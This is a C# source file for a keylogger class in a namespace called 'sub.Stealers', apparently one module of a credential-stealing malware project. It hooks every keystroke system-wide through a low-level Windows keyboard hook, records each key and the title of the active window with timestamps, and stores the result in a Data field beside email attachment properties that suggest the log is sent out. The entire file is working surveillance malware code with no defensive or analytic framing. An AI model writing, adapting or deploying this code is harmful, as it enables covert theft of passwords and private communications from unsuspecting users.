﻿#region Imports

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using sub.Util.Misc;

#endregion

namespace sub.Stealers
{
    internal class Keylogger : IStealer
    {
        #region Keyboard Hooks

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private IntPtr _hookID = IntPtr.Zero;
        private LowLevelKeyboardProc _proc;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
                                                      LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
                                                    IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                                        GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                if (wParam == (IntPtr) WM_KEYDOWN)
                {
                    ProcessKeyDown(Marshal.ReadInt32(lParam));
                }
                else if (wParam == (IntPtr) WM_KEYUP)
                {
                    ProcessKeyUp(Marshal.ReadInt32(lParam));
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        //Window title
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        #endregion

        private string _name = "Keylogger";
        private string _windowTitle;
        private bool _shift, _capslock, _showFullResults, _includeWindowTitles;

        public Keylogger() : this(true, true) {}

        public Keylogger(bool showFullResults, bool includeWindowTitles)
        {
            _proc = HookCallback;
            _shift = false;
            _capslock = false;
            _windowTitle = "";
            _showFullResults = showFullResults;
            _includeWindowTitles = includeWindowTitles;
        }

        #region IStealer Members

        public List<Attachment> Attachments { get; set; }

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        #endregion

        private void ProcessKeyDown(int code)
        {
            //look for a change in the window title, if so add it to the log
            //Note: due to the lack of a desire to waste CPU cycles to check for it every time, the log will always start with \r\n which isn't a huge deal
            if (_includeWindowTitles && _windowTitle != GetActiveWindowTitle())
            {
                //removed for now because it would put the -'s immediately after the logged keys which makes reading somewhat difficult
                //Data += "------------";
                _windowTitle = GetActiveWindowTitle();
                Data += string.Format("\r\n[{0}][{1}]\r\n", DateTime.Now, _windowTitle);
            }

            if (code >= 65 && code <= 90)
            {
                Data += (_shift ^ _capslock) ? ((Keys) code).ToString() : ((Keys) code).ToString().ToLower();
            }
            else
            {
                switch (code)
                {
                    case 8:
                        Data += "[Backspace]";
                        break;
                    case 20:
                        _capslock = !_capslock;
                        break;
                    case 32:
                        Data += " ";
                        break;
                    case 48:
                        Data += _shift ? ")" : "0";
                        break;
                    case 49:
                        Data += _shift ? "!" : "1";
                        break;
                    case 50:
                        Data += _shift ? "@" : "2";
                        break;
                    case 51:
                        Data += _shift ? "#" : "3";
                        break;
                    case 52:
                        Data += _shift ? "$" : "4";
                        break;
                    case 53:
                        Data += _shift ? "%" : "5";
                        break;
                    case 54:
                        Data += _shift ? "^" : "6";
                        break;
                    case 55:
                        Data += _shift ? "&" : "7";
                        break;
                    case 56:
                        Data += _shift ? "*" : "8";
                        break;
                    case 57:
                        Data += _shift ? "(" : "9";
                        break;
                    case 96:
                        Data += "0";
                        break;
                    case 97:
                        Data += "1";
                        break;
                    case 98:
                        Data += "2";
                        break;
                    case 99:
                        Data += "3";
                        break;
                    case 100:
                        Data += "4";
                        break;
                    case 101:
                        Data += "5";
                        break;
                    case 102:
                        Data += "6";
                        break;
                    case 103:
                        Data += "7";
                        break;
                    case 104:
                        Data += "8";
                        break;
                    case 105:
                        Data += "9";
                        break;
                    case 160:
                        _shift = true;
                        break;
                    case 161:
                        _shift = true;
                        break;
                    case 186:
                        Data += _shift ? ":" : ";";
                        break;
                    case 187:
                        Data += _shift ? "+" : "=";
                        break;
                    case 188:
                        Data += _shift ? "<" : ",";
                        break;
                    case 189:
                        Data += _shift ? "_" : "-";
                        break;
                    case 190:
                        Data += _shift ? ">" : ".";
                        break;
                    case 191:
                        Data += _shift ? "?" : "/";
                        break;
                    case 192:
                        Data += _shift ? "~" : "`";
                        break;
                    case 219:
                        Data += _shift ? "{" : "[";
                        break;
                    case 220:
                        Data += _shift ? "|" : "\\";
                        break;
                    case 221:
                        Data += _shift ? "}" : "]";
                        break;
                    case 222:
                        Data += _shift ? "\"" : "'";
                        break;
                    default:
                        if (_showFullResults)
                            Data += "[" + (Keys) code + "]";
                        break;
                }
            }
        }

        private void ProcessKeyUp(int code)
        {
            if (code == 160 || code == 161)
                _shift = false;
        }
    }
}